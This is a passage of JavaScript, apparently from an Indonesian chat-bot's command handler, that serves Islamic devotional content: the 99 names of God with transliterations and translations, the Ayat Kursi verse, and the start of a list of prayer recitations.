const anjuran = `
Dari Abu hurarirah radhiallahu anhu, Rasulullah Saw bersabda: "إِنَّ لِلَّهِ تَعَالَى تِسْعَةً وَتِسْعِينَ اسْمًا، مِائَةٌ إِلَّا وَاحِدًا، مَنْ أَحْصَاهَا دخل الجنة، وهو وتر يُحِبُّ الْوِتْرَ"
Artinya: "Sesungguhnya Allah mempunyai sembilan puluh sembilan nama, alias seratus kurang satu. Barang siapa yang menghitung-hitungnya, niscaya masuk surga; Dia Witir dan menyukai yang witir".`
const asmaulhusna = [
{
index: 1,
latin: "Ar Rahman",
arabic: "الرَّحْمَنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemurah",
translation_en: "The All Beneficent"
},
{
index: 2,
latin: "Ar Rahiim",
arabic: "الرَّحِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Penyayang",
translation_en: "The Most Merciful"
},
{
index: 3,
latin: "Al Malik",
arabic: "الْمَلِكُ",
translation_id: "Yang Memiliki Mutlak sifat Merajai/Memerintah",
translation_en: "The King, The Sovereign"
},
{
index: 4,
latin: "Al Quddus",
arabic: "الْقُدُّوسُ",
translation_id: "Yang Memiliki Mutlak sifat Suci",
translation_en: "The Most Holy"
},
{
index: 5,
latin: "As Salaam",
arabic: "السَّلاَمُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Kesejahteraan",
translation_en: "Peace and Blessing"
},
{
index: 6,
latin: "Al Mu’min",
arabic: "الْمُؤْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Memberi Keamanan",
translation_en: "The Guarantor"
},
{
index: 7,
latin: "Al Muhaimin",
arabic: "الْمُهَيْمِنُ",
translation_id: "Yang Memiliki Mutlak sifat Pemelihara",
translation_en: "The Guardian, the Preserver"
},
{
index: 8,
latin: "Al ‘Aziiz",
arabic: "الْعَزِيزُ",
translation_id: "Yang Memiliki Mutlak Kegagahan",
translation_en: "The Almighty, the Self Sufficient"
},
{
index: 9,
latin: "Al Jabbar",
arabic: "الْجَبَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Perkasa",
translation_en: "The Powerful, the Irresistible"
},
{
index: 10,
latin: "Al Mutakabbir",
arabic: "الْمُتَكَبِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Megah,Yang Memiliki Kebesaran",
translation_en: "The Tremendous"
},
{
index: 11,
latin: "Al Khaliq",
arabic: "الْخَالِقُ",
translation_id: "Yang Memiliki Mutlak sifat Pencipta",
translation_en: "The Creator"
},
{
index: 12,
latin: "Al Baari’",
arabic: "الْبَارِئُ",
translation_id: "Yang Memiliki Mutlak sifat Yang Melepaskan(Membuat, Membentuk, Menyeimbangkan)",
translation_en: "The Maker"
},
{
index: 13,
latin: "Al Mushawwir",
arabic: "الْمُصَوِّرُ",
translation_id: "Yang Memiliki Mutlak sifat YangMembentuk Rupa (makhluknya)",
translation_en: "The Fashioner of Forms"
},
{
index: 14,
latin: "Al Ghaffaar",
arabic: "الْغَفَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Pengampun",
translation_en: "The Ever Forgiving"
},
{
index: 15,
latin: "Al Qahhaar",
arabic: "الْقَهَّارُ",
translation_id: "Yang Memiliki Mutlak sifat Memaksa",
translation_en: "The All Compelling Subduer"
},
{
index: 16,
latin: "Al Wahhaab",
arabic: "الْوَهَّابُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Karunia",
translation_en: "The Bestower"
},
{
index: 17,
latin: "Ar Razzaaq",
arabic: "الرَّزَّاقُ",
translation_id: "Yang Memiliki Mutlak sifat Pemberi Rejeki",
translation_en: "The Ever Providing"
},
{
index: 18,
latin: "Al Fattaah",
arabic: "الْفَتَّاحُ",
translation_id: "Yang Memiliki Mutlak sifat Pembuka Rahmat",
translation_en: "The Opener, the Victory Giver"
},
{
index: 19,
latin: "Al ‘Aliim",
arabic: "اَلْعَلِيْمُ",
translation_id: "Yang Memiliki Mutlak sifatMengetahui (Memiliki Ilmu)",
translation_en: "The All Knowing, the Omniscient"
},
{
index: 20,
latin: "Al Qaabidh",
arabic: "الْقَابِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMenyempitkan (makhluknya)",
translation_en: "The Restrainer, the Straightener"
},
{
index: 21,
latin: "Al Baasith",
arabic: "الْبَاسِطُ",
translation_id: "Yang Memiliki Mutlak sifat YangMelapangkan (makhluknya)",
translation_en: "The Expander, the Munificent"
},
{
index: 22,
latin: "Al Khaafidh",
arabic: "الْخَافِضُ",
translation_id: "Yang Memiliki Mutlak sifat YangMerendahkan (makhluknya)",
translation_en: "The Abaser"
},
{
index: 23,
latin: "Ar Raafi’",
arabic: "الرَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat YangMeninggikan (makhluknya)",
translation_en: "The Exalter"
},
{
index: 24,
latin: "Al Mu’izz",
arabic: "الْمُعِزُّ",
translation_id: "Yang Memiliki Mutlak sifat YangMemuliakan (makhluknya)",
translation_en: "The Giver of Honor"
},
{
index: 25,
latin: "Al Mudzil",
arabic: "المُذِلُّ",
translation_id: "Yang Memiliki Mutlak sifatYang Menghinakan (makhluknya)",
translation_en: "The Giver of Dishonor"
},
{
index: 26,
latin: "Al Samii’",
arabic: "السَّمِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendengar",
translation_en: "The All Hearing"
},
{
index: 27,
latin: "Al Bashiir",
arabic: "الْبَصِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melihat",
translation_en: "The All Seeing"
},
{
index: 28,
latin: "Al Hakam",
arabic: "الْحَكَمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menetapkan",
translation_en: "The Judge, the Arbitrator"
},
{
index: 29,
latin: "Al ‘Adl",
arabic: "الْعَدْلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Utterly Just"
},
{
index: 30,
latin: "Al Lathiif",
arabic: "اللَّطِيفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Lembut",
translation_en: "The Subtly Kind"
},
{
index: 31,
latin: "Al Khabiir",
arabic: "الْخَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifatMaha Mengetahui Rahasia",
translation_en: "The All Aware"
},
{
index: 32,
latin: "Al Haliim",
arabic: "الْحَلِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penyantun",
translation_en: "The Forbearing, the Indulgent"
},
{
index: 33,
latin: "Al ‘Azhiim",
arabic: "الْعَظِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Agung",
translation_en: "The Magnificent, the Infinite"
},
{
index: 34,
latin: "Al Ghafuur",
arabic: "الْغَفُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengampun",
translation_en: "The All Forgiving"
},
{
index: 35,
latin: "As Syakuur",
arabic: "الشَّكُورُ",
translation_id: "Yang Memiliki Mutlak sifat MahaPembalas Budi (Menghargai)",
translation_en: "The Grateful"
},
{
index: 36,
latin: "Al ‘Aliy",
arabic: "الْعَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Sublimely Exalted"
},
{
index: 37,
latin: "Al Kabiir",
arabic: "الْكَبِيرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Besar",
translation_en: "The Great"
},
{
index: 38,
latin: "Al Hafizh",
arabic: "الْحَفِيظُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menjaga",
translation_en: "The Preserver"
},
{
index: 39,
latin: "Al Muqiit",
arabic: "المُقيِت",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Kecukupan",
translation_en: "The Nourisher"
},
{
index: 40,
latin: "Al Hasiib",
arabic: "الْحسِيبُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMembuat Perhitungan",
translation_en: "The Reckoner"
},
{
index: 41,
latin: "Al Jaliil",
arabic: "الْجَلِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Majestic"
},
{
index: 42,
latin: "Al Kariim",
arabic: "الْكَرِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemurah",
translation_en: "The Bountiful, the Generous"
},
{
index: 43,
latin: "Ar Raqiib",
arabic: "الرَّقِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengawasi",
translation_en: "The Watchful"
},
{
index: 44,
latin: "Al Mujiib",
arabic: "الْمُجِيبُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengabulkan",
translation_en: "The Responsive, the Answerer"
},
{
index: 45,
latin: "Al Waasi’",
arabic: "الْوَاسِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Luas",
translation_en: "The Vast, the All Encompassing"
},
{
index: 46,
latin: "Al Hakiim",
arabic: "الْحَكِيمُ",
translation_id: "Yang Memiliki Mutlak sifat Maka Bijaksana",
translation_en: "The Wise"
},
{
index: 47,
latin: "Al Waduud",
arabic: "الْوَدُودُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencinta",
translation_en: "The Loving, the Kind One"
},
{
index: 48,
latin: "Al Majiid",
arabic: "الْمَجِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The All Glorious"
},
{
index: 49,
latin: "Al Baa’its",
arabic: "الْبَاعِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Membangkitkan",
translation_en: "The Raiser of the Dead"
},
{
index: 50,
latin: "As Syahiid",
arabic: "الشَّهِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
translation_en: "The Witness"
},
{
index: 51,
latin: "Al Haqq",
arabic: "الْحَقُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
translation_en: "The Truth, the Real"
},
{
index: 52,
latin: "Al Wakiil",
arabic: "الْوَكِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
translation_en: "The Trustee, the Dependable"
},
{
index: 53,
latin: "Al Qawiyyu",
arabic: "الْقَوِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
translation_en: "The Strong"
},
{
index: 54,
latin: "Al Matiin",
arabic: "الْمَتِينُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
translation_en: "The Firm, the Steadfast"
},
{
index: 55,
latin: "Al Waliyy",
arabic: "الْوَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
translation_en: "The Protecting Friend, Patron, and Helper"
},
{
index: 56,
latin: "Al Hamiid",
arabic: "الْحَمِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
translation_en: "The All Praiseworthy"
},
{
index: 57,
latin: "Al Mushii",
arabic: "الْمُحْصِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
translation_en: "The Accounter, the Numberer of All"
},
{
index: 58,
latin: "Al Mubdi’",
arabic: "الْمُبْدِئُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
translation_en: "The Producer, Originator, and Initiator of all"
},
{
index: 59,
latin: "Al Mu’iid",
arabic: "الْمُعِيدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
translation_en: "The Reinstater Who Brings Back All"
},
{
index: 60,
latin: "Al Muhyii",
arabic: "الْمُحْيِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
translation_en: "The Giver of Life"
},
{
index: 61,
latin: "Al Mumiitu",
arabic: "اَلْمُمِيتُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
translation_en: "The Bringer of Death, the Destroyer"
},
{
index: 62,
latin: "Al Hayyu",
arabic: "الْحَيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
translation_en: "The Ever Living"
},
{
index: 63,
latin: "Al Qayyuum",
arabic: "الْقَيُّومُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
translation_en: "The Self Subsisting Sustainer of All"
},
{
index: 64,
latin: "Al Waajid",
arabic: "الْوَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
translation_en: "The Perceiver, the Finder, the Unfailing"
},
{
index: 65,
latin: "Al Maajid",
arabic: "الْمَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Illustrious, the Magnificent"
},
{
index: 66,
latin: "Al Wahiid",
arabic: "الْواحِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
translation_en: "The One, The Unique, Manifestation of Unity"
},
{
index: 67,
latin: "Al ‘Ahad",
arabic: "اَلاَحَدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
translation_en: "The One, the All Inclusive, the Indivisible"
},
{
index: 68,
latin: "As Shamad",
arabic: "الصَّمَدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
},
{
index: 69,
latin: "Al Qaadir",
arabic: "الْقَادِرُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
translation_en: "The All Able"
},
{
index: 70,
latin: "Al Muqtadir",
arabic: "الْمُقْتَدِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
translation_en: "The All Determiner, the Dominant"
},
{
index: 71,
latin: "Al Muqaddim",
arabic: "الْمُقَدِّمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
translation_en: "The Expediter, He who brings forward"
},
{
index: 72,
latin: "Al Mu’akkhir",
arabic: "الْمُؤَخِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
translation_en: "The Delayer, He who puts far away"
},
{
index: 73,
latin: "Al Awwal",
arabic: "الأوَّلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
translation_en: "The First"
},
{
index: 74,
latin: "Al Aakhir",
arabic: "الآخِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
translation_en: "The Last"
},
{
index: 75,
latin: "Az Zhaahir",
arabic: "الظَّاهِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
translation_en: "The Manifest; the All Victorious"
},
{
index: 76,
latin: "Al Baathin",
arabic: "الْبَاطِنُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
translation_en: "The Hidden; the All Encompassing"
},
{
index: 77,
latin: "Al Waali",
arabic: "الْوَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
translation_en: "The Patron"
},
{
index: 78,
latin: "Al Muta’aalii",
arabic: "الْمُتَعَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Self Exalted"
},
{
index: 79,
latin: "Al Barri",
arabic: "الْبَرُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
translation_en: "The Most Kind and Righteous"
},
{
index: 80,
latin: "At Tawwaab",
arabic: "التَّوَابُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
translation_en: "The Ever Returning, Ever Relenting"
},
{
index: 81,
latin: "Al Muntaqim",
arabic: "الْمُنْتَقِمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
translation_en: "The Avenger"
},
{
index: 82,
latin: "Al Afuww",
arabic: "العَفُوُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
translation_en: "The Pardoner, the Effacer of Sins"
},
{
index: 83,
latin: "Ar Ra`uuf",
arabic: "الرَّؤُوفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
translation_en: "The Compassionate, the All Pitying"
},
{
index: 84,
latin: "Malikul Mulk",
arabic: "مَالِكُ الْمُلْكِ",
translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
translation_en: "The Owner of All Sovereignty"
},
{
index: 85,
latin: "Dzul JalaaliWal Ikraam",
arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
translation_en: "The Lord of Majesty and Generosity"
},
{
index: 86,
latin: "Al Muqsith",
arabic: "الْمُقْسِطُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Equitable, the Requiter"
},
{
index: 87,
latin: "Al Jamii’",
arabic: "الْجَامِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
translation_en: "The Gatherer, the Unifier"
},
{
index: 88,
latin: "Al Ghaniyy",
arabic: "الْغَنِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
translation_en: "The All Rich, the Independent"
},
{
index: 89,
latin: "Al Mughnii",
arabic: "الْمُغْنِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
translation_en: "The Enricher, the Emancipator"
},
{
index: 90,
latin: "Al Maani",
arabic: "اَلْمَانِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
translation_en: "The Withholder, the Shielder, the Defender"
},
{
index: 91,
latin: "Ad Dhaar",
arabic: "الضَّارَّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
translation_en: "The Distressor, the Harmer"
},
{
index: 92,
latin: "An Nafii’",
arabic: "النَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
translation_en: "The Propitious, the Benefactor"
},
{
index: 93,
latin: "An Nuur",
arabic: "النُّورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
translation_en: "The Light"
},
{
index: 94,
latin: "Al Haadii",
arabic: "الْهَادِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
translation_en: "The Guide"
},
{
index: 95,
latin: "Al Baadii",
arabic: "الْبَدِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
translation_en: "Incomparable, the Originator"
},
{
index: 96,
latin: "Al Baaqii",
arabic: "اَلْبَاقِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
translation_en: "The Ever Enduring and Immutable"
},
{
index: 97,
latin: "Al Waarits",
arabic: "الْوَارِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
translation_en: "The Heir, the Inheritor of All"
},
{
index: 98,
latin: "Ar Rasyiid",
arabic: "الرَّشِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
translation_en: "The Guide, Infallible Teacher, and Knower"
},
{
index: 99,
latin: "As Shabuur",
arabic: "الصَّبُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
translation_en: "The Patient"
}
]
let json = JSON.parse(JSON.stringify(asmaulhusna))
let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
if (isNaN(args[0])) return reply (`contoh:\nasmaulhusna 1`)
if (args[0]) {
if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
return reply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
}
reply(`${contoh} + ${data} + ${anjuran}`)
}
break
        
 //=================================\\  // AYAT KURSI    
        
case 'ayatkur1si': {
let caption = `
*「 Ayat Kursi 」*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
reply(caption)
}
break
        
 //=================================\\  // Bacaan sholat    
        
case 'bacaansholat': 
case 'bacaansalat':
case 'bacaanshalat':
case 'bacaansolat':{
const bacaanshalat = {
"result": [
{
 "id": 1,
 "name": "Bacaan Iftitah",
 "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
 "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
 "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang telah menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. Tidak ada sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
},
{
 "id": 2,
 "name": "Al Fatihah",
 "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَاالصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
 "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
 "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang telah Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
},
{
 "id": 3,
 "name": "Bacaan Ruku",
 "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
 "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
 "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
},
{
 "id": 4,
 "name": "Bacaan Sujud",
 "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
 "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
 "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
},
{
 "id": 5,
 "name": "Bacaan Duduk Diantara Dua Sujud",
 "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
 "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
 "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
},
{
 "id": 6,
 "name": "Duduk Tasyahud Awal",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
 "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
},
{
 "id": 7,
 "name": "Duduk Tasyahud Akhir",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
